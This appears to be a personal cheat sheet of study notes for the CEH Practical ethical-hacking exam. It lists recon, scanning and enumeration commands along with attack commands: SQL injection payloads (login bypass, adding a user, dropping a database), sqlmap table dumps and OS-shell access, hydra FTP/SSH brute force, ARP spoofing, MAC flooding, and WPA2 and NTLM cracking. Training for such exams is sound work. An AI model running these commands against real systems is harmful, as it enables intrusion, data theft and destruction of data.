# CEH-Practical

## Footprinting and recon
#### Reverse image serach
```bash
https://mattw.io/youtube-metadata/
```
#### Ping finding  maximum packet/frame size
```bash
ping <address> -f -l 1500
```
#### Find ip of website
```bash
nslookup <IP-Address>
```
#### hosting DNS for website
```bash
nslookup -type=ns moviescope.com
```
#### Find primary server with nslookup 
```bash
nslookup -querytype=soa <URL>
```

#### Classic information gathering of webadress
```bash
whois <URL>
```
#### Banner grabbing
```bash
nc -vv <URL> 80
```
#### or
```bash
telnet <URL> 80
```
##### Then type
```bash
GET / HTTP/1.0
```
#### Footprinting of website
```bash
whatweb -v
```
#### nmap extract information about a website
```bash
nmap -sV --script=http-enum <URL/IP>
```
#### nmap check firewall
```bash
nmap -p80 --script http-waf-detect  <URL/IP>
```
#### nmap find name of the DNS server hosting the domain
```bash
nmap -sS -sU -p 53 --script=dns-recursion moviescope.com
```
#### web-server fingerprinting 
##### directories
```bash
uniscan -u <URL>:<port> -q
```
#### Gobuster find directories of website
```bash
gobuster dir -u <URL> -w <wordlist>
```
#### bruteforcing file extension
```bash
python3 dirsearch.py -u <URL> -e <extension>
```
#### bruteforcing status code
python3 dirsearch.py -u <URL> -x <status code>
#### Detect loadbalancing
```bash
lbd <URL>
```
##### dynamic
```bash
uniscan -u <URL>:<port> -d
```
## Scanning Netwroks
#### ICMP Echo
```bash
nmap <IP/mask>
```
#### OS-discovery
```bash
sudo nmap --script smb-os-discovery.nse
```

#### Netdiscover
```bash
sudo netdiscover -i eth0
```
#### Nmap scan IP's
```bash
nmap -sn IP-Address/mask -oG liveip.txt
```
#### Nmap scan ports and version on IP
```bash
nmap -sV -p IP-Address
```
## Enumeration
#### NetBIOS Enumeration
```bash
nbtscan -v -s : <target-ip-or-hostname>
```
```bash
nmap -sV 172.16.1.102 --script nbstat.nse
```
#### SNMP-check to find information about a host
```bash
snmp-check <target-ip-address>
```
##### You can alose perfom a SNMP enumeration using SoftPerfect on the windows machine :)
#### LDAP enumeration
##### You can alose perfom a LDAP enumeration by the tool on thw windows machine named "Active Directory Explorer"
## Service brute force
#### DNS enumeration
```bash
dnsenum <hostname>
```

#### SMTP list number of users
```bash
nmap --script smtp-enum-users <target>
```
#### Find http-server-header
```bash
nmap -sV -A -p 80 <target>
```

#### Enum4linux to find  users, groups, shares, (RID)
```bash
enum4linux <target>
```

## Vulnerability analysis
### can vulnerbilites with nikto to find uncommon header
```bash
nikto -h (Target Website) -Tuning x
```

## Malware threst
### See text file size
```bash
 E:\CEH-Tools\CEHv12 Module 07 Malware Threats\Malware Analysis Tools\Static Malware Analysis Tools\String Searching Tools\BinText
```
#### See Subsystem of file 
```bash
E:\CEH-Tools\CEHv12 Module 07 Malware Threats\Malware Analysis Tools\Static Malware Analysis Tools\Packaging and Obfuscation Tools\PEid
```
#### Se OS of efl-file
```bash
E:\CEH-Tools\CEHv12 Module 07 Malware Threats\Malware Analysis Tools\Static Malware Analysis Tools\Packaging and Obfuscation Tools\DIE
```

## Sniffing
#### mac flood attack, n is number of packets
```bash
macof -i eth0 -n 10 
```
#### arpsppofing, t is target
```bash
 arpspoof -i eth0 -t 10.10.1.11 10.10.1.1
```
#### See password in wireshark
```bash
http.request.method == POST
```

## Denial of service
#### not much

## Session Hijacking

## Hacking Web Server
#### See if adress is vulnerable for clickjacking
```bash
python3 ghost_eye.py 
```
#### FTP brute force
```bash
hydra -L userlist.txt -P passwordlist.txt ftp://IP-Address -V
```
#### See content
```bash
ftp://IP-Address/folder
```

#### SSH brute force
#### Username can be Ubuntu
```bash
hydra -L userlist.txt -P passwordlist.txt IP-Address ssh -V
```

## SQL injection
#### Login bypass
```bash
blah' or 1=1 --
```
#### Add new user
```bash
blah';insert into login values ('john','apple123'); -- 
```
#### Create new database
```bash
blah';create database mydatabase; --
```
#### Drop database
```bash
blah'; DROP DATABASE mydatabase; -- 
```

#### SQLmap
##### Inspect page, in the console page, type document.cookie in the lower-left corner of the browser, and press Enter. Select the cookie value, then right-click and copy it
#### Check databases
```bash
sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="<cookie value>" --dbs 
```
#### See tables of database
```bash
sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="<cookie value>" -D <database> --tables
```
#### Dump table from database
```bash
sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="<cookie value>" -D <database> -T <table> --dump
```
#### Get shell
```bash
sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="<cookie value>" --os-shell
```
#### DSS
##### Get cookie just like SQLmap
python3 dsss.py -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="<cookie value>"

#### Use ZAP Automated scan to find CWE and WASC ID numbers

### Hacking Wireless Networks
#### aircrack-ng crack WEP-key
```bash
aircrack-ng <pcap-file>
``` 
#### aircrack-ng crack WPA2-key
```bash
aircrack-ng -a2 -b <Target BSSID> -w <wordlist> <pcap-file>
``` 
 
## Mobile Devices
#### Use phonesploit, phones are found on port 5555
```bash
python3 -m pip install colorama
```
```bash
python3 phonesploit.py
```
 
## Cryptography
#### Decode file
##### Use BCTextEncoder on the Windows machine
#### Decrypt file
##### Use Advance Encryption Package on the Windows machine
#### Decrypt a volume
##### Use VeraCrypt on the Windows machine
#### Calculate md5 hashe
##### Use on MD5 Calculator on the Windows machine
#### Snow Steganography
```bash
-C -p password output.txt
```

## Cracking
#### Use hash-identifier to find hash
#### Use cracksation for fast lookup
#### NTLM with john
```bash
john --wordlists=<worlist> --format=nt <hash> 
```

## Priviligie escalation
####
```bash
sudo -i
```


